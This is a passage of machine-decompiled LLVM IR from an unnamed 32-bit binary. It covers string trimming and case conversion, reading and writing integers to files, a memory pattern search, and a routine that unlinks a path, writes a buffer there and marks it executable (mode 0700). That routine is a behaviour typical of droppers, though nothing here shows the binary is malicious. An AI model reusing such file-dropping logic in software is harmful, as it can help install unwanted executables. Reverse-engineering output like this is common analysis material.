  store i8 0, i8* %stack_var_-20.0834, align 1
  %v1_401990 = add i32 %v4_4019e036, 1
  %v5_401994 = inttoptr i32 %v1_401990 to i8*
  %v1_4019a0 = add i32 %stack_var_-24.1735, 1
  br label %dec_label_pc_4019a8

dec_label_pc_4019a8:                              ; preds = %dec_label_pc_40193c.dec_label_pc_4019a8_crit_edge, %dec_label_pc_401954
  %v5_4019b4.pre-phi = phi i8* [ %.pre13, %dec_label_pc_40193c.dec_label_pc_4019a8_crit_edge ], [ %v5_401994, %dec_label_pc_401954 ]
  %stack_var_-16.0 = phi i8* [ %stack_var_-16.1933, %dec_label_pc_40193c.dec_label_pc_4019a8_crit_edge ], [ %v5_401994, %dec_label_pc_401954 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.1735, %dec_label_pc_40193c.dec_label_pc_4019a8_crit_edge ], [ %v1_4019a0, %dec_label_pc_401954 ]
  %v2_4019c4 = icmp ult i32 %stack_var_-24.0, %arg4
  %v1_4019c8 = icmp eq i1 %v2_4019c4, false
  br i1 %v1_4019c8, label %dec_label_pc_4019f4, label %dec_label_pc_4019a8.dec_label_pc_4019cc_crit_edge

dec_label_pc_4019a8.dec_label_pc_4019cc_crit_edge: ; preds = %dec_label_pc_4019a8
  %v3_4019d0.pre = load i8*, i8** %stack_var_0, align 4
  %v4_4019d0 = ptrtoint i8* %v3_4019d0.pre to i32
  %v2_4019dc = add i32 %v4_4019d0, %v4_401924
  %v4_4019e0 = ptrtoint i8* %v5_4019b4.pre-phi to i32
  %v2_4019e8 = icmp ult i32 %v2_4019dc, %v4_4019e0
  %v1_4019ec = icmp eq i1 %v2_4019e8, false
  br i1 %v1_4019ec, label %dec_label_pc_40193c, label %dec_label_pc_4019f4

dec_label_pc_4019f4:                              ; preds = %dec_label_pc_4019cc.lr.ph, %dec_label_pc_4019a8.dec_label_pc_4019cc_crit_edge, %dec_label_pc_4019a8, %dec_label_pc_4018c8
  %stack_var_-24.1.lcssa = phi i32 [ 0, %dec_label_pc_4018c8 ], [ 0, %dec_label_pc_4019cc.lr.ph ], [ %stack_var_-24.0, %dec_label_pc_4019a8.dec_label_pc_4019cc_crit_edge ], [ %stack_var_-24.0, %dec_label_pc_4019a8 ]
  ret i32 %stack_var_-24.1.lcssa

; uselistorder directives
  uselistorder i32 %v4_4019e0, { 1, 0 }
  uselistorder i32 %stack_var_-24.0, { 0, 1, 3, 2 }
  uselistorder i8* %v5_4019b4.pre-phi, { 1, 0 }
  uselistorder i8* %stack_var_-16.1933, { 1, 0 }
  uselistorder i32 %stack_var_-24.1735, { 1, 0, 2 }
  uselistorder i32 %v4_401924, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_4019f4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_4019a8, { 1, 0 }
  uselistorder label %dec_label_pc_40193c, { 1, 0 }
}

define i32 @function_401a10(i8* %arg1) local_unnamed_addr {
dec_label_pc_401a10:
  %v1_401a44 = icmp eq i8* %arg1, null
  br i1 %v1_401a44, label %dec_label_pc_401c2c, label %dec_label_pc_401a48

dec_label_pc_401a48:                              ; preds = %dec_label_pc_401a10
  br label %dec_label_pc_401a7c

dec_label_pc_401a60:                              ; preds = %dec_label_pc_401af0, %dec_label_pc_401ad8, %dec_label_pc_401ac0, %dec_label_pc_401aa8, %dec_label_pc_401a90, %dec_label_pc_401a7c
  store i8 0, i8* %storemerge4, align 1
  %v1_401a74 = add i32 %v4_401a7c, 1
  %v5_401a78 = inttoptr i32 %v1_401a74 to i8*
  br label %dec_label_pc_401a7c

dec_label_pc_401a7c:                              ; preds = %dec_label_pc_401a48, %dec_label_pc_401a60
  %storemerge4 = phi i8* [ %v5_401a78, %dec_label_pc_401a60 ], [ %arg1, %dec_label_pc_401a48 ]
  %v4_401a7c = ptrtoint i8* %storemerge4 to i32
  %v2_401a84 = load i8, i8* %storemerge4, align 1
  %v2_401a8c = icmp eq i8 %v2_401a84, 32
  br i1 %v2_401a8c, label %dec_label_pc_401a60, label %dec_label_pc_401a90

dec_label_pc_401a90:                              ; preds = %dec_label_pc_401a7c
  %v2_401a9c = load i8, i8* %storemerge4, align 1
  %v2_401aa4 = icmp eq i8 %v2_401a9c, 10
  br i1 %v2_401aa4, label %dec_label_pc_401a60, label %dec_label_pc_401aa8

dec_label_pc_401aa8:                              ; preds = %dec_label_pc_401a90
  %v2_401ab4 = load i8, i8* %storemerge4, align 1
  %v2_401abc = icmp eq i8 %v2_401ab4, 9
  br i1 %v2_401abc, label %dec_label_pc_401a60, label %dec_label_pc_401ac0

dec_label_pc_401ac0:                              ; preds = %dec_label_pc_401aa8
  %v2_401acc = load i8, i8* %storemerge4, align 1
  %v2_401ad4 = icmp eq i8 %v2_401acc, 11
  br i1 %v2_401ad4, label %dec_label_pc_401a60, label %dec_label_pc_401ad8

dec_label_pc_401ad8:                              ; preds = %dec_label_pc_401ac0
  %v2_401ae4 = load i8, i8* %storemerge4, align 1
  %v2_401aec = icmp eq i8 %v2_401ae4, 12
  br i1 %v2_401aec, label %dec_label_pc_401a60, label %dec_label_pc_401af0

dec_label_pc_401af0:                              ; preds = %dec_label_pc_401ad8
  %v2_401afc = load i8, i8* %storemerge4, align 1
  %v2_401b04 = icmp eq i8 %v2_401afc, 13
  br i1 %v2_401b04, label %dec_label_pc_401a60, label %dec_label_pc_401b08

dec_label_pc_401b08:                              ; preds = %dec_label_pc_401af0
  %v2_401b14 = load i8, i8* %storemerge4, align 1
  %v1_401b1c = icmp eq i8 %v2_401b14, 0
  br i1 %v1_401b1c, label %dec_label_pc_401c2c, label %dec_label_pc_401b20

dec_label_pc_401b20:                              ; preds = %dec_label_pc_401b08
  %v4_401b40 = call i32 @strlen(i8* nonnull %storemerge4)
  %v1_401b4c = add i32 %v4_401a7c, -1
  %v2_401b58 = add i32 %v1_401b4c, %v4_401b40
  %storemerge6 = inttoptr i32 %v2_401b58 to i8*
  %v2_401b907 = icmp ult i8* %storemerge4, %storemerge6
  %v1_401b949 = icmp eq i1 %v2_401b907, false
  br i1 %v1_401b949, label %dec_label_pc_401c2c, label %dec_label_pc_401b98

dec_label_pc_401b68:                              ; preds = %dec_label_pc_401c10, %dec_label_pc_401bf8, %dec_label_pc_401be0, %dec_label_pc_401bc8, %dec_label_pc_401bb0, %dec_label_pc_401b98
  store i8 0, i8* %storemerge11, align 1
  %v1_401b7c = add i32 %storemerge510, -1
  %storemerge = inttoptr i32 %v1_401b7c to i8*
  %v2_401b90 = icmp ult i8* %storemerge4, %storemerge
  %v1_401b94 = icmp eq i1 %v2_401b90, false
  br i1 %v1_401b94, label %dec_label_pc_401c2c, label %dec_label_pc_401b98

dec_label_pc_401b98:                              ; preds = %dec_label_pc_401b20, %dec_label_pc_401b68
  %storemerge11 = phi i8* [ %storemerge, %dec_label_pc_401b68 ], [ %storemerge6, %dec_label_pc_401b20 ]
  %storemerge510 = phi i32 [ %v1_401b7c, %dec_label_pc_401b68 ], [ %v2_401b58, %dec_label_pc_401b20 ]
  %v2_401ba4 = load i8, i8* %storemerge11, align 1
  %v2_401bac = icmp eq i8 %v2_401ba4, 32
  br i1 %v2_401bac, label %dec_label_pc_401b68, label %dec_label_pc_401bb0

dec_label_pc_401bb0:                              ; preds = %dec_label_pc_401b98
  %v2_401bbc = load i8, i8* %storemerge11, align 1
  %v2_401bc4 = icmp eq i8 %v2_401bbc, 10
  br i1 %v2_401bc4, label %dec_label_pc_401b68, label %dec_label_pc_401bc8

dec_label_pc_401bc8:                              ; preds = %dec_label_pc_401bb0
  %v2_401bd4 = load i8, i8* %storemerge11, align 1
  %v2_401bdc = icmp eq i8 %v2_401bd4, 9
  br i1 %v2_401bdc, label %dec_label_pc_401b68, label %dec_label_pc_401be0

dec_label_pc_401be0:                              ; preds = %dec_label_pc_401bc8
  %v2_401bec = load i8, i8* %storemerge11, align 1
  %v2_401bf4 = icmp eq i8 %v2_401bec, 11
  br i1 %v2_401bf4, label %dec_label_pc_401b68, label %dec_label_pc_401bf8

dec_label_pc_401bf8:                              ; preds = %dec_label_pc_401be0
  %v2_401c04 = load i8, i8* %storemerge11, align 1
  %v2_401c0c = icmp eq i8 %v2_401c04, 12
  br i1 %v2_401c0c, label %dec_label_pc_401b68, label %dec_label_pc_401c10

dec_label_pc_401c10:                              ; preds = %dec_label_pc_401bf8
  %v2_401c1c = load i8, i8* %storemerge11, align 1
  %v2_401c24 = icmp eq i8 %v2_401c1c, 13
  br i1 %v2_401c24, label %dec_label_pc_401b68, label %dec_label_pc_401c2c

dec_label_pc_401c2c:                              ; preds = %dec_label_pc_401b68, %dec_label_pc_401c10, %dec_label_pc_401b20, %dec_label_pc_401b08, %dec_label_pc_401a10
  %stack_var_-16.0 = phi i8* [ null, %dec_label_pc_401a10 ], [ %arg1, %dec_label_pc_401b08 ], [ %storemerge4, %dec_label_pc_401b20 ], [ %storemerge4, %dec_label_pc_401c10 ], [ %storemerge4, %dec_label_pc_401b68 ]
  %v4_401c2c = ptrtoint i8* %stack_var_-16.0 to i32
  ret i32 %v4_401c2c

; uselistorder directives
  uselistorder i8* %storemerge11, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 14, 13, 12 }
  uselistorder label %dec_label_pc_401c2c, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_401b98, { 1, 0 }
  uselistorder label %dec_label_pc_401a7c, { 1, 0 }
}

define i32 @function_401c48(i8* %arg1) local_unnamed_addr {
dec_label_pc_401c48:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_0, align 4
  %v1_401c70 = icmp eq i8* %arg1, null
  br i1 %v1_401c70, label %dec_label_pc_401cf0, label %dec_label_pc_401cd8.preheader

dec_label_pc_401cd8.preheader:                    ; preds = %dec_label_pc_401c48
  %v2_401ce03 = load i8, i8* %arg1, align 1
  %v3_401ce04 = sext i8 %v2_401ce03 to i32
  %v1_401ce85 = icmp eq i8 %v2_401ce03, 0
  br i1 %v1_401ce85, label %dec_label_pc_401cf0, label %dec_label_pc_401c88

dec_label_pc_401c88:                              ; preds = %dec_label_pc_401cd8.preheader, %dec_label_pc_401c88
  %v3_401c88 = phi i8* [ %v5_401cd4, %dec_label_pc_401c88 ], [ %arg1, %dec_label_pc_401cd8.preheader ]
  %v2_401c90 = load i8, i8* %v3_401c88, align 1
  %v3_401c90 = sext i8 %v2_401c90 to i32
  %v2_401ca8 = call i32 @tolower(i32 %v3_401c90)
  %v1_401cb4 = mul i32 %v2_401ca8, 16777216
  %v1_401cb8 = sdiv i32 %v1_401cb4, 16777216
  %v3_401cbc = load i8*, i8** %stack_var_0, align 4
  %v1_401cc4 = trunc i32 %v1_401cb8 to i8
  store i8 %v1_401cc4, i8* %v3_401cbc, align 1
  %v4_401cc8 = ptrtoint i8* %v3_401cbc to i32
  %v1_401cd0 = add i32 %v4_401cc8, 1
  %v5_401cd4 = inttoptr i32 %v1_401cd0 to i8*
  store i8* %v5_401cd4, i8** %stack_var_0, align 4
  %v2_401ce0 = load i8, i8* %v5_401cd4, align 1
  %v3_401ce0 = sext i8 %v2_401ce0 to i32
  %v1_401ce8 = icmp eq i8 %v2_401ce0, 0
  br i1 %v1_401ce8, label %dec_label_pc_401cf0, label %dec_label_pc_401c88

dec_label_pc_401cf0:                              ; preds = %dec_label_pc_401c88, %dec_label_pc_401cd8.preheader, %dec_label_pc_401c48
  %v1_401d00 = phi i32 [ %tmp, %dec_label_pc_401c48 ], [ %v3_401ce04, %dec_label_pc_401cd8.preheader ], [ %v3_401ce0, %dec_label_pc_401c88 ]
  ret i32 %v1_401d00

; uselistorder directives
  uselistorder i8* %v5_401cd4, { 1, 2, 0 }
  uselistorder i8** %stack_var_0, { 2, 1, 0 }
  uselistorder i8* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_401c88, { 1, 0 }
}

define i32 @function_401d08(i8* %arg1) local_unnamed_addr {
dec_label_pc_401d08:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_0, align 4
  %v1_401d30 = icmp eq i8* %arg1, null
  br i1 %v1_401d30, label %dec_label_pc_401db0, label %dec_label_pc_401d98.preheader

dec_label_pc_401d98.preheader:                    ; preds = %dec_label_pc_401d08
  %v2_401da03 = load i8, i8* %arg1, align 1
  %v3_401da04 = sext i8 %v2_401da03 to i32
  %v1_401da85 = icmp eq i8 %v2_401da03, 0
  br i1 %v1_401da85, label %dec_label_pc_401db0, label %dec_label_pc_401d48

dec_label_pc_401d48:                              ; preds = %dec_label_pc_401d98.preheader, %dec_label_pc_401d48
  %v3_401d48 = phi i8* [ %v5_401d94, %dec_label_pc_401d48 ], [ %arg1, %dec_label_pc_401d98.preheader ]
  %v2_401d50 = load i8, i8* %v3_401d48, align 1
  %v3_401d50 = sext i8 %v2_401d50 to i32
  %v2_401d68 = call i32 @toupper(i32 %v3_401d50)
  %v1_401d74 = mul i32 %v2_401d68, 16777216
  %v1_401d78 = sdiv i32 %v1_401d74, 16777216
  %v3_401d7c = load i8*, i8** %stack_var_0, align 4
  %v1_401d84 = trunc i32 %v1_401d78 to i8
  store i8 %v1_401d84, i8* %v3_401d7c, align 1
  %v4_401d88 = ptrtoint i8* %v3_401d7c to i32
  %v1_401d90 = add i32 %v4_401d88, 1
  %v5_401d94 = inttoptr i32 %v1_401d90 to i8*
  store i8* %v5_401d94, i8** %stack_var_0, align 4
  %v2_401da0 = load i8, i8* %v5_401d94, align 1
  %v3_401da0 = sext i8 %v2_401da0 to i32
  %v1_401da8 = icmp eq i8 %v2_401da0, 0
  br i1 %v1_401da8, label %dec_label_pc_401db0, label %dec_label_pc_401d48

dec_label_pc_401db0:                              ; preds = %dec_label_pc_401d48, %dec_label_pc_401d98.preheader, %dec_label_pc_401d08
  %v1_401dc0 = phi i32 [ %tmp, %dec_label_pc_401d08 ], [ %v3_401da04, %dec_label_pc_401d98.preheader ], [ %v3_401da0, %dec_label_pc_401d48 ]
  ret i32 %v1_401dc0

; uselistorder directives
  uselistorder i8* %v5_401d94, { 1, 2, 0 }
  uselistorder i8** %stack_var_0, { 2, 1, 0 }
  uselistorder i8* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_401d48, { 1, 0 }
}

define i32 @function_401dc8(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_401dc8:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 -1, i32* %stack_var_-16, align 4
  store i32 -1, i32* %stack_var_-12, align 4
  %v7_401e1c = call %_IO_FILE* @fopen(i8* %arg1, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_40a710.30, i32 0, i32 0))
  %v1_401e34 = icmp eq %_IO_FILE* %v7_401e1c, null
  br i1 %v1_401e34, label %dec_label_pc_401ea4.thread, label %dec_label_pc_401e38

dec_label_pc_401e38:                              ; preds = %dec_label_pc_401dc8
  %v11_401e64 = call i32 (%_IO_FILE*, i8*, ...) @fscanf(%_IO_FILE* nonnull %v7_401e1c, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_40a714.32, i32 0, i32 0), i32* nonnull %stack_var_-16, i32* nonnull %stack_var_-12)
  %v2_401e78 = icmp eq i32 %v11_401e64, 2
  %v4_401e98 = call i32 @fclose(%_IO_FILE* nonnull %v7_401e1c)
  br i1 %v2_401e78, label %dec_label_pc_401eb0, label %dec_label_pc_401ea4.thread

dec_label_pc_401ea4.thread:                       ; preds = %dec_label_pc_401dc8, %dec_label_pc_401e38
  br label %dec_label_pc_401ef4

dec_label_pc_401eb0:                              ; preds = %dec_label_pc_401e38
  %v1_401ebc = icmp eq i32 %arg2, 0
  br i1 %v1_401ebc, label %dec_label_pc_401ed4, label %dec_label_pc_401ec0

dec_label_pc_401ec0:                              ; preds = %dec_label_pc_401eb0
  %v3_401ec4 = load i32, i32* %stack_var_-16, align 4
  %v2_401ed0 = inttoptr i32 %arg2 to i32*
  store i32 %v3_401ec4, i32* %v2_401ed0, align 4
  br label %dec_label_pc_401ed4

dec_label_pc_401ed4:                              ; preds = %dec_label_pc_401eb0, %dec_label_pc_401ec0
  %v1_401edc = icmp eq i32 %arg3, 0
  br i1 %v1_401edc, label %dec_label_pc_401ef4, label %dec_label_pc_401ee0

dec_label_pc_401ee0:                              ; preds = %dec_label_pc_401ed4
  %v3_401ee4 = load i32, i32* %stack_var_-12, align 4
  %v2_401ef0 = inttoptr i32 %arg3 to i32*
  store i32 %v3_401ee4, i32* %v2_401ef0, align 4
  br label %dec_label_pc_401ef4

dec_label_pc_401ef4:                              ; preds = %dec_label_pc_401ea4.thread, %dec_label_pc_401ed4, %dec_label_pc_401ee0
  %v4_401ea45 = phi i32 [ 0, %dec_label_pc_401ea4.thread ], [ 1, %dec_label_pc_401ed4 ], [ 1, %dec_label_pc_401ee0 ]
  ret i32 %v4_401ea45

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0, 2 }
  uselistorder label %dec_label_pc_401ef4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_401ed4, { 1, 0 }
  uselistorder label %dec_label_pc_401ea4.thread, { 1, 0 }
}

define i32 @function_401f10(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_401f10:
  %v7_401f50 = call %_IO_FILE* @fopen(i8* %arg1, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_40a71c.35, i32 0, i32 0))
  %v1_401f68 = icmp eq %_IO_FILE* %v7_401f50, null
  br i1 %v1_401f68, label %dec_label_pc_401fc8, label %dec_label_pc_401f6c

dec_label_pc_401f6c:                              ; preds = %dec_label_pc_401f10
  %v9_401f90 = call i32 (%_IO_FILE*, i8*, ...) @fprintf(%_IO_FILE* nonnull %v7_401f50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_40a714.32, i32 0, i32 0), i32 %arg2, i32 %arg3)
  %v4_401fac = call i32 @fclose(%_IO_FILE* nonnull %v7_401f50)
  br label %dec_label_pc_401fc8

dec_label_pc_401fc8:                              ; preds = %dec_label_pc_401f10, %dec_label_pc_401f6c
  %storemerge = phi i32 [ 1, %dec_label_pc_401f6c ], [ 0, %dec_label_pc_401f10 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_401fc8, { 1, 0 }
}

define i32 @function_401fe0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_401fe0:
  %stack_var_0 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_0, align 4
  %v4_402020 = call i32 @unlink(i8* %arg1)
  %v7_402044 = call %_IO_FILE* @fopen(i8* %arg1, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_40a71c.35, i32 0, i32 0))
  %v1_40205c = icmp eq %_IO_FILE* %v7_402044, null
  br i1 %v1_40205c, label %dec_label_pc_4021b4, label %dec_label_pc_40211c.outer

dec_label_pc_402088:                              ; preds = %dec_label_pc_40211c
  br i1 %v1_4020a0, label %dec_label_pc_4020b0, label %dec_label_pc_4020a8

dec_label_pc_4020a8:                              ; preds = %dec_label_pc_402088
  br label %dec_label_pc_4020b0

dec_label_pc_4020b0:                              ; preds = %dec_label_pc_402088, %dec_label_pc_4020a8
  %v0_4020b8 = phi i32 [ %stack_var_-28.0.ph, %dec_label_pc_402088 ], [ 1024, %dec_label_pc_4020a8 ]
  %v8_4020cc = call i32 @fwrite(i32* %v6_4020cc, i32 1, i32 %v0_4020b8, %_IO_FILE* nonnull %v7_402044)
  %v1_4020e4 = icmp eq i32 %v8_4020cc, 0
  br i1 %v1_4020e4, label %dec_label_pc_40211c, label %dec_label_pc_4020f4

dec_label_pc_4020f4:                              ; preds = %dec_label_pc_4020b0
  %v2_402100 = add i32 %v8_4020cc, %stack_var_-24.0.ph
  %v2_402114 = sub i32 %stack_var_-28.0.ph, %v8_4020cc
  br label %dec_label_pc_40211c.outer

dec_label_pc_40211c.outer:                        ; preds = %dec_label_pc_401fe0, %dec_label_pc_4020f4
  %stack_var_-24.0.ph = phi i32 [ %v2_402100, %dec_label_pc_4020f4 ], [ 0, %dec_label_pc_401fe0 ]
  %stack_var_-28.0.ph = phi i32 [ %v2_402114, %dec_label_pc_4020f4 ], [ %arg3, %dec_label_pc_401fe0 ]
  %v1_402124 = icmp eq i32 %stack_var_-28.0.ph, 0
  %v2_402094 = add i32 %stack_var_-24.0.ph, %arg2
  %v1_4020a0 = icmp ult i32 %stack_var_-28.0.ph, 1025
  %v6_4020cc = inttoptr i32 %v2_402094 to i32*
  br label %dec_label_pc_40211c

dec_label_pc_40211c:                              ; preds = %dec_label_pc_40211c.outer, %dec_label_pc_4020b0
  br i1 %v1_402124, label %dec_label_pc_40216c, label %dec_label_pc_402088

dec_label_pc_40216c:                              ; preds = %dec_label_pc_40211c
  %v4_402154 = call i32 @fclose(%_IO_FILE* nonnull %v7_402044)
  %v3_402198 = load i8*, i8** %stack_var_0, align 4
  %v5_402184 = call i32 @chmod(i8* %v3_402198, i32 448)
  br label %dec_label_pc_4021b4

dec_label_pc_4021b4:                              ; preds = %dec_label_pc_401fe0, %dec_label_pc_40216c
  %stack_var_-32.1 = phi i32 [ 0, %dec_label_pc_401fe0 ], [ 1, %dec_label_pc_40216c ]
  ret i32 %stack_var_-32.1

; uselistorder directives
  uselistorder i32 %stack_var_-28.0.ph, { 2, 1, 0, 3 }
  uselistorder i32 %v8_4020cc, { 1, 0, 2 }
  uselistorder i8** %stack_var_0, { 1, 0 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_40a71c.35, i32 0, i32 0), { 1, 0 }
  uselistorder label %dec_label_pc_4021b4, { 1, 0 }
  uselistorder label %dec_label_pc_40211c.outer, { 1, 0 }
  uselistorder label %dec_label_pc_4020b0, { 1, 0 }
}

define i32 @function_4021d0(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4021d0:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_4022ac2 = add i32 %tmp, %arg4
  %v2_4022bc = add i32 %tmp, %arg3
  %v2_4022c03 = icmp ult i32 %v2_4022ac2, %v2_4022bc
  br i1 %v2_4022c03, label %dec_label_pc_40222c.lr.ph, label %dec_label_pc_4022cc

dec_label_pc_40222c.lr.ph:                        ; preds = %dec_label_pc_4021d0
  %v1_402240 = inttoptr i32 %arg2 to i8*
  %v5_402268 = inttoptr i32 %arg2 to i32*
  br label %dec_label_pc_40222c

dec_label_pc_40222c:                              ; preds = %dec_label_pc_40222c.lr.ph, %dec_label_pc_402290
  %storemerge5 = phi i32 [ %tmp, %dec_label_pc_40222c.lr.ph ], [ %v1_402298, %dec_label_pc_402290 ]
  %v1_402234 = inttoptr i32 %storemerge5 to i8*
  %v2_402234 = load i8, i8* %v1_402234, align 1
  %v2_402240 = load i8, i8* %v1_402240, align 1
  %v2_402248 = icmp eq i8 %v2_402234, %v2_402240
  br i1 %v2_402248, label %dec_label_pc_40224c, label %dec_label_pc_402290

dec_label_pc_40224c:                              ; preds = %dec_label_pc_40222c
  %v4_402268 = inttoptr i32 %storemerge5 to i32*
  %v6_402268 = call i32 @memcmp(i32* %v4_402268, i32* %v5_402268, i32 %arg4)
  %v1_402274 = icmp eq i32 %v6_402268, 0
  br i1 %v1_402274, label %dec_label_pc_402278, label %dec_label_pc_402290

dec_label_pc_402278:                              ; preds = %dec_label_pc_40224c
  br label %dec_label_pc_4022cc

dec_label_pc_402290:                              ; preds = %dec_label_pc_40224c, %dec_label_pc_40222c
  %v1_402298 = add i32 %storemerge5, 1
  %v2_4022ac = add i32 %v1_402298, %arg4
  %v2_4022c0 = icmp ult i32 %v2_4022ac, %v2_4022bc
  br i1 %v2_4022c0, label %dec_label_pc_40222c, label %dec_label_pc_4022cc

dec_label_pc_4022cc:                              ; preds = %dec_label_pc_402290, %dec_label_pc_4021d0, %dec_label_pc_402278
  %stack_var_-20.0 = phi i32 [ %storemerge5, %dec_label_pc_402278 ], [ 0, %dec_label_pc_4021d0 ], [ 0, %dec_label_pc_402290 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %v2_4022bc, { 1, 0 }
  uselistorder i32 %tmp, { 2, 0, 1 }
  uselistorder i32 %arg4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_4022cc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_40222c, { 1, 0 }
}

define i32 @function_4022f0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4022f0:
  %v0.global-to-local = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-292 = alloca i32, align 4
  %v3_402338 = load i32, i32* @global_var_41b120.42, align 4
  store i32 %v3_402338, i32* %v0.global-to-local, align 4
  %v1_402350 = icmp eq i32 %v3_402338, 0
  br i1 %v1_402350, label %dec_label_pc_4023e8, label %dec_label_pc_402354

dec_label_pc_402354:                              ; preds = %dec_label_pc_4022f0
  %v3_402364 = load i32, i32* @global_var_41b124.43, align 4
  store i32 %v3_402364, i32* %v0.global-to-local, align 4
  %v1_40237c = icmp eq i32 %v3_402364, 0
  br i1 %v1_40237c, label %dec_label_pc_4023d8, label %dec_label_pc_402380

dec_label_pc_402380:                              ; preds = %dec_label_pc_402354
  %v1_40238c = icmp ult i32 %tmp38, 21
  %v2_40238c = zext i1 %v1_40238c to i32
  store i32 %v2_40238c, i32* %v0.global-to-local, align 4
  %v1_402390 = icmp eq i1 %v1_40238c, false
  br i1 %v1_402390, label %dec_label_pc_402688.thread, label %dec_label_pc_402394

dec_label_pc_402394:                              ; preds = %dec_label_pc_402380
  store i32 1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4023fc

dec_label_pc_4023d8:                              ; preds = %dec_label_pc_402354
  store i32 1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4023fc

dec_label_pc_4023e8:                              ; preds = %dec_label_pc_4022f0
  store i32 1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4023fc

dec_label_pc_4023fc:                              ; preds = %dec_label_pc_4023e8, %dec_label_pc_4023d8, %dec_label_pc_402394
  store i32 1, i32* %v0.global-to-local, align 4
  %v3_402400 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32292) to i32*), align 4
  store i32 %v3_402400, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402400)
  %v0_402418 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_402418, i32* %stack_var_-292, align 4
  %v3_402424 = load i32, i32* @global_var_41b12c.46, align 4
  store i32 %v3_402424, i32* %v0.global-to-local, align 4
  %v1_40243c = icmp eq i32 %v3_402424, 0
  br i1 %v1_40243c, label %dec_label_pc_402440, label %dec_label_pc_402688

dec_label_pc_402440:                              ; preds = %dec_label_pc_4023fc
  %v3_402454 = load i32, i32* @global_var_41b224.31, align 4
  store i32 %v3_402454, i32* %v0.global-to-local, align 4
  %v7_402460 = call %_IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_40a758.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_40a764.48, i32 0, i32 0))
  %v9_402460 = ptrtoint %_IO_FILE* %v7_402460 to i32
  store i32 %v9_402460, i32* %v0.global-to-local, align 4
  %v1_402478 = icmp eq %_IO_FILE* %v7_402460, null
  br i1 %v1_402478, label %dec_label_pc_402628, label %dec_label_pc_4025dc.preheader

dec_label_pc_4025dc.preheader:                    ; preds = %dec_label_pc_402440
  %v2_4025dc = ptrtoint i32* %stack_var_-268 to i32
  %tmp41 = bitcast i32* %stack_var_-268 to i8*
  store i32 %v2_4025dc, i32* %v0.global-to-local, align 4
  %v3_4025ec42 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32300) to i32*), align 4
  store i32 %v3_4025ec42, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4025ec42)
  %v0_40260443 = load i32, i32* %v0.global-to-local, align 4
  %v1_40260444 = icmp eq i32 %v0_40260443, 0
  br i1 %v1_40260444, label %dec_label_pc_402608, label %dec_label_pc_402488

dec_label_pc_402488:                              ; preds = %dec_label_pc_4025dc.preheader, %dec_label_pc_4025dc.backedge
  %v3_402490 = load i32, i32* @global_var_41b1e8.19, align 4
  store i32 %v3_402490, i32* %v0.global-to-local, align 4
  %v4_40249c = call i32 @strlen(i8* %tmp41)
  store i32 %v4_40249c, i32* %v0.global-to-local, align 4
  %v1_4024b4 = icmp eq i32 %v4_40249c, 0
  br i1 %v1_4024b4, label %dec_label_pc_4025dc.backedge, label %dec_label_pc_4024c4

dec_label_pc_4024c4:                              ; preds = %dec_label_pc_402488
  store i32 0, i32* %stack_var_-284, align 4
  %v2_40254414 = icmp sgt i32 %v4_40249c, 0
  %v3_40254415 = zext i1 %v2_40254414 to i32
  store i32 %v3_40254415, i32* %v0.global-to-local, align 4
  br i1 %v2_40254414, label %dec_label_pc_4024d4, label %dec_label_pc_402550.thread

dec_label_pc_402550.thread:                       ; preds = %dec_label_pc_4024c4
  store i32 0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4025dc.backedge

